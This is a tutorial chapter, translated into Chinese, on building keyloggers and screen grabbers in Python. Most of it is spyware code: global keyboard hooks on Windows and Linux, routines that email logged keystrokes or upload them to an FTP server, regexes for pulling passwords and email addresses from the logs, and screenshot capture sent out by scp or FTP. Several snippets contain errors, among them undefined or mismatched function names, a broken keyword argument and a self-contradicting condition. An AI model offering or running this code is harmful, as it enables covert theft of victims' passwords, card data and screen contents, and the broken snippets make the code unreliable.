# 第 8 章按键记录和屏幕抓取

使用 Python，我们可以以编程方式执行任务，例如捕获所有击键、捕获屏幕、记录正在运行的程序、关闭它们、监视剪贴板内容等等。黑客可能利用这些技术恶意获取受害者的私人信息，而雇主可能利用这些技术监控员工的活动。

本章涵盖的主题如下：

*   使用 Python 进行键记录
*   抓屏

# 键盘记录器

**键盘记录器**是一种实时记录或记录击键的软件或硬件设备。它们用于解决计算机和网络的技术问题。它们还可以用于监控网络和计算机的使用情况，而不需要他们的直接知识。因此，这也可能被滥用在公共计算机上，窃取密码或信用卡信息。

## 硬件键盘记录器

基于硬件的键盘记录器可以在不安装任何软件的情况下监控受害者的活动。它们很容易被检测到，因为它是一个物理设备，可能连接在计算机键盘和 USB/PS2 端口之间的某个位置。还有更先进的硬件键盘记录器，它们不在外部可见，也不依赖于任何软件。因此，任何软件都无法检测到它们。但是，硬件键盘记录器需要对受害者进行物理访问。

在无线键盘的情况下，可以通过无线嗅探器截获从键盘发送到接收器的信号。

## 软件键盘记录器

通过软件键盘记录器，我们可以从远程系统访问本地记录的击键。这可以通过将记录的击键上传到数据库或 FTP 服务器来实现。我们也可以定期将其作为电子邮件附件发送。

# 带 pyhook 的键盘记录器

要创建一个简单的键盘记录器脚本，在计算机上记录击键活动并将其存储在文本文件中，我们可以使用`pyhook`模块。这将为 Windows 系统中的全局鼠标和键盘事件提供回调。

导入所需的模块。这里，我们从 ActivePython 包导入`pyhook`和 pythoncom 模块。此脚本中使用`pythoncom`模块为当前线程泵送所有消息：

```
import pyHook, pythoncom, sys, logging 

```

定义保存日志数据的文件。（Windows 文件名使用反斜杠作为分隔符。但是，在 Python 中，反斜杠是一个转义字符，因此我们必须在路径中放置一个双斜杠“`\\`”。否则，我们可以使用 rawstring 定义文件名。）：

```
file_log='C:\\log.txt' 

```

现在我们可以定义处理每个键盘事件的函数。在这里，我们可以使用日志模块记录每个字符：

```
def OnKeyboardEvent(event): 
    logging.basicConfig(filename*file_log, level=logging.DEBUG, format='%(message)s') 
    chr(event.Ascii) 
    logging.log(10,chr(event.Ascii)) 
    return True 

```

在这里，我们实例化`pyhook`管理器：

```
hooks_manager = pyHook.HookManager() 

```

在每次击键时调用键盘事件函数：

```
hooks_manager.KeyDown = OnKeyboardEvent 
hooks_manager.HookKeyboard() 
pythoncom.PumpMessages() 

```

这将在 Windows 系统中工作。要使用 Linux，我们必须依赖另一个模块：`pyxhook`。您可以从[获取此模块 https://github.com/JeffHoogland/pyxhook](https://github.com/JeffHoogland/pyxhook) 。

使用`pyxhook`，您可以重写前面的脚本以使用 Linux：

```
import pyxhook 
file_log=/home/rejah/Desktop/file.log' 
def OnKeyboardEvent(event): 
   k = event.Key 

    if k == "space": k = " " 

   with open(file_log, 'a+') as keylogging: 
      keylogging.write('%s\n' % k)   

#instantiate HookManager class 
hooks_manager = pyxhook.HookManager() 

#listen to all keystrokes 
hooks_manager.KeyDown=OnKeyPress 

#hook the keyboard 
hooks_manager.HookKeyboard() 

#start the session 
hooks_manager.start() 

```

我们可以改进脚本，将击键记录到远程服务器或处理特定的击键。

要将记录的击键发送到电子邮件，我们可以使用`smtplib`模块。我们需要导入所需的模块：

```
import time 
import datetime 
import smtplib 
from email.mime.text import MIMEText

```

然后，我们可以定义通过连接 SMTP 服务器发送电子邮件的方法：

```
def sendEmail(data,to): 
    try: 
        # Provide from email address 
        from = 'you@yourdomain.com' 
        # Your SMTP username 
        username = 'keylogger' 
        # Your Email password 
        password = 'asd123' 
        # Use MIMEText to create an email 
        mail = MIMEText(data, 'html') 
        mail['Subject']  = "Keylogger Data --" +str(datetime.datetime.now()) 
        mail['From']=from 
        mail['To'] = to 

        # Send the message via your SMTP server 
        server = smtplib.SMTP('smtp.yourdomain.com:587') 
        # Enable TLS if required 
        server.starttls() 
        server.login(username,password) 
        server.sendmail(from, [to], mail.as_string()) 
        server.quit() 
    except: 
        pass

```

现在我们可以将数据和地址传递给这个方法。这会将击键发送到指定的地址。现在我们可以重写`OnKeyboardEvent`方法来发送击键：

```
def OnKeyboardEvent(event): 
    # Write character only if its not a null or backspace  
    if event.Ascii !=0 or 8: 
        # Open log file and read the current keystrokes in log file 
        f=open('c:\log.txt','r+') 
        buffer=f.read() 
        f.close()  

        if len(buffer)%100==0 and len(buffer)%100!=0: 
            #send last 1000 characters to the email 
            send_email(buffer[-1000:].replace("\n","<br>"),email) 

        # Open the log.txt file to update new keystrokes 
        f=open('c:\log.txt','w') 
        keylogs=chr(event.Ascii) 

        # if the key pressed is ENTER, update with /n  
        if event.Ascii==13: 
            keylogs='\n' 

        #if the key pressed is space, update with space  
        if event.Ascii==32: 
            keylogs='  ' 

        # Add new keystrokes to buffer 
        buffer+=keylogs 

        # Write the buffer to log file 
        f.write(buffer) 
        # close the log file 
        f.close() 

```

现在，当日志文件中有 1000 个字符时，这会将击键发送到指定的电子邮件 ID。同样，我们可以添加一种方法将文件上载到 FTP 服务器。这里我们需要导入`ftplib`模块和`os`模块：

```
import ftplib 
import os 

```

然后，定义将文件上载到 FTP 服务器的方法

```
def uploadToFTP(data,to): 
    # Write data to a file 
    fileName="log-"+str(datetime.datetime.now()+".txt" 
    logFile=open(fileName,"a") 
    logFile.write(data) 
    logFile.close() 

    try: 
        # Provide FTP server address 
        server = 'yourdomain.com' 
        # Your FTP username 
        username = 'keylogger' 
        # Your FTP password 
        password = 'asd123' 
        # SSL state, set 1 if SSL enabled in server 
        SSL = 0 
        # FTP Directory to upload the file 
        directory = "/"  
        # Create normal FTP connection If SSL disabled 
        if SSL==0: 
            connection=ftplib.FTP(server,username,password) 
        # Create SSL enabled FTP connection 
        elif SSL==1: 
            connection=ftplib.FTP_TLS(server,username,password) 

        # Change directory in FTP connection 
        connection.cwd(directory) 
        # Open the log file 

        logFile=open(fileName,'rb') 
        # Upload the file to FTP server 
        connection.storbinary('STOR' +' '+fileName,logFile) 
        # Close the FTP connection 
        connection.quit() 
        # Close the log file 
        logFile.close() 
        # Delete the temporary log file 
        os.remove(fileName) 
    except: 
        pass
```

现在我们可以在`OnKeyboardEvent`函数中使用此方法将击键上传到 FTP 服务器。

键盘记录器的输出将是一个巨大的文件，包含兆字节的文本，其中隐藏着数据。我们可以使用正则表达式扫描此文件以获取所需的数据。例如，两个正则表达式将匹配一堆文本中的用户名和密码。

要识别电子邮件 ID，可以使用以下正则表达式：

```
 ^[\w!#$%&'*+\-/=?\^_`{|}~]+(\.[\w!#$%&'*+\-/=?\^_`{|}~]+)*@((([\-\w]+\.)+[a-zA-Z]{2,4})|(([0-9]{1,3}\.){3}[0-9]{1,3}))$ 

```

要识别长度超过六个字母的类似密码的模式，请执行以下操作：

```
(?=^.{6,}$)(?=.*\d)(?=.*[a-zA-Z])

```

使用正则表达式，我们可以搜索任何具有模式且可以构建到正则表达式中的数据。这些数据的一些示例包括社会安全号码、信用卡号码、银行帐户、电话号码、姓名、密码等。

# 抓屏

屏幕抓取器捕获受害者的桌面并将图像发送到远程服务器。有许多 Python 模块可用于以编程方式获取屏幕的光栅图像。我们可以在 Windows 和 OSX 上使用**Python 图像库**（**PIL**）。PIL 包包含可用于抓取屏幕截图的 `ImageGrab`模块。

导入模块，这里我们还导入时间模块，以使执行休眠三秒，允许用户在抓取之前切换屏幕显示：

```
from PIL import ImageGrab 
import time

```

睡眠三秒钟并拍摄屏幕截图：

```
time.sleep(3) 
ImageGrab.grab().save("screen_capture.jpg", "JPEG") 

```

我们还可以通过提供以下区域在屏幕上拍摄特定区域的屏幕截图：

```
ImageGrab.grab(bbox=(10,10,510,510)).save("screen_capture.jpg", "JPEG") where, bbox=(X1,Y1,X2,Y2)

```

以下屏幕截图说明了该示例：

![Screen grabbing](images/image_08_001.jpg)

要在 Linux 系统上抓取屏幕截图，我们必须使用具有跨平台兼容性的`wxPython`库。我们可以从[下载 wxPythonhttp://wxpython.org/download.php](http://wxpython.org/download.php)

导入 wx 模块：

```
import wx 

```

首先，创建应用程序实例：

```
wx.App()

```

`wx.ScreenDC`方法提供对整个桌面的访问，其中还包括任何扩展的桌面监视器屏幕：

```
screen = wx.ScreenDC() 
size = screen.GetSize() 

```

以屏幕大小作为目标创建新的空位图：

```
bmp = wx.EmptyBitmap(size[0], size[1]) 
mem = wx.MemoryDC(bmp) 

```

将屏幕位图复制到返回的捕获位图中：

```
mem.Blit(0, 0, size[0], size[1], screen, 0, 0) 
del mem 

```

将位图另存为图像：

```
bmp.SaveFile('screenshot.png', wx.BITMAP_TYPE_PNG) 

```

此外，我们可以将此屏幕截图发送到远程位置，只需对脚本进行最小的更改。例如，我们可以使用`scp`协议将其发送到另一台服务器：

```
import os 
os.system("scp screenshot.png user@remote-server.com:/home/user/")

```

或者，我们可以使用`ftplib`使用 FTP 协议上传文件：

导入模块`ftplib`：

```
import ftplib 

```

使用远程服务器凭据启动新会话：

```
session = ftplib.FTP('remote-server.com','user','password') 

```

使用以下代码打开文件：

```
file = open('screenshot.png','rb')

```

发送文件：

```
session.storbinary('STOR screenshot.png', file)

```

关闭文件和 FTP 会话：

```
file.close()                                     
session.quit() 

```

# 总结

我们已经讨论了可以使用 Python 进行键记录和屏幕抓取的基本模块。现在，您可以创建这些脚本的自定义版本来记录键和抓取屏幕截图。我们将在下一章中介绍一些攻击自动化技术。